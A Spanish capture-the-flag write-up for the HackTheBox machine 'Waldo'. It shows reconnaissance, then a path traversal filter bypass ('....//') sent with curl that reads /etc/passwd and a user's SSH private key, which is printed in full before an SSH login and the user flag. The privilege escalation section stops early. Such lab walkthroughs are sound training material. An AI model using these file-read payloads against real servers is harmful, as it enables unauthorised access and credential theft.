# WriteUp HackTheBox Waldo

[Nota]: esta maquina fue realizada según el WriteUp realizado por S4vitar

## Descripción de la máquina

![Waldo_Image](Images/Waldo.png)

La resolución de la máquina presenta las siguiente fases:

* Reconocimiento
    * nmap
    * whatweb
* Explotación
    * Local File Inclusion - Filter Bypass
    * Obtención de una ssh key
* Escalada de privilegios
    * Escape del contenedor
    * Escape de la Restricted Shell
    * Abussing de capabilities

# Fase de Reconocimiento

Se realiza una prueba de ping para confirmar que haya conexión con la máquina

> ping 10.10.10.87 -c1

```console
PING 10.10.10.87 (10.10.10.87) 56(84) bytes of data.
64 bytes from 10.10.10.87: icmp_seq=1 ttl=63 time=126 ms

--- 10.10.10.87 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 126.333/126.333/126.333/0.000 ms
```

Para identificar el sistema operativo usamos la utilidad proporcionada por S4vitar whichSystem.py[^1]

[^1]: la utilidad se puede descargar de <https://github.com/Akronox/WichSystem.py>

> whichSystem.py 10.10.10.87

```console
10.10.10.87 (ttl -> 63): Linux
```

Se realiza una revisión de puertos con nmap con las siguientes opciones

* -p-: Para realizar el escaneo en todos los 65000 puertos TCP
* --open: Para reportar solamente los puertos que se encuentran abiertos
* -sS: TCP SYN port scan, este argumento se utiliza para realizar un escaneo rapido de puertos
* --min-rate: El argumento le exige a nmap realizar el escaneo con una tasa de paquetes por segundo no menor a la solicitada
* -vvv: triple verbose para mostrar más información
* -n: para que no realice resolución dns en el scaneo
* -Pn: Desabilita el descubrimiento del host a traves de ping
* -oG: exporta lo reportado en un archivo en formato grepeable

> sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn 10.10.10.87 -oG allPorts

```console
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-14 00:58 -04
Initiating SYN Stealth Scan at 00:58
Scanning 10.10.10.87 [65535 ports]
Discovered open port 22/tcp on 10.10.10.87
Discovered open port 80/tcp on 10.10.10.87
Completed SYN Stealth Scan at 00:58, 13.47s elapsed (65535 total ports)
Nmap scan report for 10.10.10.87
Host is up, received user-set (0.13s latency).
Scanned at 2022-08-14 00:58:44 -04 for 14s
Not shown: 65532 closed tcp ports (reset), 1 filtered tcp port (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.60 seconds
           Raw packets sent: 66685 (2.934MB) | Rcvd: 66664 (2.667MB)
```

Por comodidad usamos la utilidad proporcionada por S4vitar extractPorts la cual nos ayuda a revisar el archivo creado por nmap 'all Ports' y nos copia los puertos en la clipboard para su posterior uso; se adjunta la utilidad a continuación

```console
extractPorts () {
        ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
        ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)"
        echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
        echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
        echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
        echo $ports | tr -d '\n' | xclip -sel clip
        echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
        /bin/bat extractPorts.tmp
        rm extractPorts.tmp

```
> extracPorts allPorts

```console
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.87
   5   │     [*] Open ports: 22,80
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 
```

Se realiza un nuevo escaneo con una serie de scripts básicos que nmap nos ofrece para ver las técnologias que corren por detrás

> nmap -sCV -p22,80 10.10.10.87 -oN targeted 

```console
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-14 01:01 -04
Nmap scan report for 10.10.10.87
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey: 
|   2048 c4:ff:81:aa:ac:df:66:9e:da:e1:c8:78:00:ab:32:9e (RSA)
|   256 b3:e7:54:6a:16:bd:c9:29:1f:4a:8c:cd:4c:01:24:27 (ECDSA)
|_  256 38:64:ac:57:56:44:d5:69:de:74:a8:88:dc:a0:b4:fd (ED25519)
80/tcp open  http    nginx 1.12.2
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: nginx/1.12.2
| http-title: List Manager
|_Requested resource was /list.html

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.67 seconds
```

Se realiza una revisión de los servicios que están corriendo en el servidor con 'watweb'

> whatweb 10.10.10.87

```console
http://10.10.10.87 [302 Found] Country[RESERVED][ZZ], HTTPServer[nginx/1.12.2], IP[10.10.10.87], PHP[7.1.16], RedirectLocation[/list.html], X-Powered-By[PHP/7.1.16], nginx[1.12.2]
http://10.10.10.87/list.html [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.12.2], IP[10.10.10.87], Script, Title[List Manager], nginx[1.12.2]
```

## Fase de Explotación

Se ingresa a la web para ver que nos sale a traves de la url http://10.10.10.87

![web_index](Images/image01.png)

Cuando se pasa la solicitud por Burpsuite, se observa que el servidor se encuentra llamando directamente a los archivos del sistema en la linea 'path=./.list/'

![burp_01](Images/image02.png)

Dado que parece que el servidor está sanitizando el ingreso del input `path` una única vez, nos encontamos con un caso similar a un Local File Inclusion donde es posible enumerar los archivos del sistema empleando `....//` en lugar de `../` para movernos a través de los archivos del sistema:

![burp_02](Images/image03.png)

De la misma manera se puede leer los archivos del sistema con el mismo bypass

![burp_03](Images/image04.png)

Por tanto para poder obtener una mejor visibilidad podemos realizar el siguiente comando para ver los usuarios que se tienen en el sistema

[Parámetros de curl]

* -s: modo silencioso
* -X: identifica el metodo (GET, POST, ...)
* -d: la data que se le mandara en la solicitud

[Parámetros de jq]

* '.["file"]': para que nos obtenga el campo "file"
* -r: para visualizarlo en formato raw

> curl -s -X POST "http://10.10.10.87/fileRead.php" -d 'file=./.list/....//....//....//....//....//....//....//etc/passwd' | jq '.["file"]' -r | grep "sh$"

```console
root:x:0:0:root:/root:/bin/ash
operator:x:11:0:operator:/root:/bin/sh
postgres:x:70:70::/var/lib/postgresql:/bin/sh
nobody:x:65534:65534:nobody:/home/nobody:/bin/sh
```

De la misma manera obtenemos la id_rsa del usuario nobody, que curiosamente en este caso se encuentra renombrada como .monitor

> curl -s -X POST "http://10.10.10.87/fileRead.php" -d 'file=./.list/....//....//....//....//....//....//....//home/nobody/.ssh/.monitor' | jq '.["file"]' -r

```console
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAs7sytDE++NHaWB9e+NN3V5t1DP1TYHc+4o8D362l5Nwf6Cpl
mR4JH6n4Nccdm1ZU+qB77li8ZOvymBtIEY4Fm07X4Pqt4zeNBfqKWkOcyV1TLW6f
87s0FZBhYAizGrNNeLLhB1IZIjpDVJUbSXG6s2cxAle14cj+pnEiRTsyMiq1nJCS
dGCc/gNpW/AANIN4vW9KslLqiAEDJfchY55sCJ5162Y9+I1xzqF8e9b12wVXirvN
o8PLGnFJVw6SHhmPJsue9vjAIeH+n+5Xkbc8/6pceowqs9ujRkNzH9T1lJq4Fx1V
vi93Daq3bZ3dhIIWaWafmqzg+jSThSWOIwR73wIDAQABAoIBADHwl/wdmuPEW6kU
vmzhRU3gcjuzwBET0TNejbL/KxNWXr9B2I0dHWfg8Ijw1Lcu29nv8b+ehGp+bR/6
pKHMFp66350xylNSQishHIRMOSpydgQvst4kbCp5vbTTdgC7RZF+EqzYEQfDrKW5
8KUNptTmnWWLPYyJLsjMsrsN4bqyT3vrkTykJ9iGU2RrKGxrndCAC9exgruevj3q
1h+7o8kGEpmKnEOgUgEJrN69hxYHfbeJ0Wlll8Wort9yummox/05qoOBL4kQxUM7
VxI2Ywu46+QTzTMeOKJoyLCGLyxDkg5ONdfDPBW3w8O6UlVfkv467M3ZB5ye8GeS
dVa3yLECgYEA7jk51MvUGSIFF6GkXsNb/w2cZGe9TiXBWUqWEEig0bmQQVx2ZWWO
v0og0X/iROXAcp6Z9WGpIc6FhVgJd/4bNlTR+A/lWQwFt1b6l03xdsyaIyIWi9xr
xsb2sLNWP56A/5TWTpOkfDbGCQrqHvukWSHlYFOzgQa0ZtMnV71ykH0CgYEAwSSY
qFfdAWrvVZjp26Yf/jnZavLCAC5hmho7eX5isCVcX86MHqpEYAFCecZN2dFFoPqI
yzHzgb9N6Z01YUEKqrknO3tA6JYJ9ojaMF8GZWvUtPzN41ksnD4MwETBEd4bUaH1
/pAcw/+/oYsh4BwkKnVHkNw36c+WmNoaX1FWqIsCgYBYw/IMnLa3drm3CIAa32iU
LRotP4qGaAMXpncsMiPage6CrFVhiuoZ1SFNbv189q8zBm4PxQgklLOj8B33HDQ/
lnN2n1WyTIyEuGA/qMdkoPB+TuFf1A5EzzZ0uR5WLlWa5nbEaLdNoYtBK1P5n4Kp
w7uYnRex6DGobt2mD+10cQKBgGVQlyune20k9QsHvZTU3e9z1RL+6LlDmztFC3G9
1HLmBkDTjjj/xAJAZuiOF4Rs/INnKJ6+QygKfApRxxCPF9NacLQJAZGAMxW50AqT
rj1BhUCzZCUgQABtpC6vYj/HLLlzpiC05AIEhDdvToPK/0WuY64fds0VccAYmMDr
X/PlAoGAS6UhbCm5TWZhtL/hdprOfar3QkXwZ5xvaykB90XgIps5CwUGCCsvwQf2
DvVny8gKbM/OenwHnTlwRTEj5qdeAM40oj/mwCDc6kpV1lJXrW2R5mCH9zgbNFla
W0iKCBUAm5xZgU/YskMsCBMNmA8A5ndRWGFEFE+VGDVPaRie0ro=
-----END RSA PRIVATE KEY-----
```

Esta clave la guardamos en un archivo llamado "nobody_id_rsa", le damos el permiso 600 y con ella ingresamos a la maquina como el usuario nobody

> curl -s -X POST "http://10.10.10.87/fileRead.php" -d 'file=./.list/....//....//....//....//....//....//....//home/nobody/.ssh/.monitor' | jq '.["file"]' -r > content/nobody_id_rsa
> sudo chown 600 nobody_id_rsa
> ssh -i nobody_id_rsa nobody@10.10.10.87

```console
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <http://wiki.alpinelinux.org>.
waldo:~$ whoami
nobody
```

desde aqui ya se puede ver la flag de usuario

> waldo:~$ cat user.txt 

```console
32768bcd7513275e085fd4e7b63e9d24
```

## Fase de Escalación de Privilegios

Algo singular de esta maquina, es que parece que fuese un contenedor
> waldo:~$ cat .ssh/authorized_keys ; echo

```console
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzuzK0MT740dpYH17403dXm3UM/VNgdz7ijwPfraXk3B/oKmWZHgkfqfg1xx2bVlT6oHvuWLxk6/KYG0gRjgWbTtfg+q3jN40F+opaQ5zJXVMtbp/zuzQVkGFgCLMas014suEHUhkiOkNUlRtJcbqzZzECV7XhyP6mcSJFOzIyKrWckJJ0YJz+A2lb8AA0g3i9b0qyUuqIAQMl9yFjnmwInnXrZj34jXHOoXx71vXbBVeKu82jw8sacUlXDpIeGY8my572+MAh4f6f7leRtzz/qlx6jCqz26NGQ3Mf1PWUmrgXHVW+L3cNqrdtnd2EghZpZp+arOD6NJOFJY4jBHvf monitor@waldo
```

> waldo:~$ cat /etc/hosts 

```console 
127.0.0.1	localhost
127.0.1.1	waldo
```


## Estructura del directorio



```
Waldo
│   Readme.md   
│
└───nmap
│   │   allPorts
│   │   targeted
│   
└───content
│   │   nobody_id_rsa
└───exploits
│
└───scripts
│
└───Images
│   │   Waldo.png
│   │   image01.png
│   │   image02.png
│   │   image03.png
│   │   image04.png
```


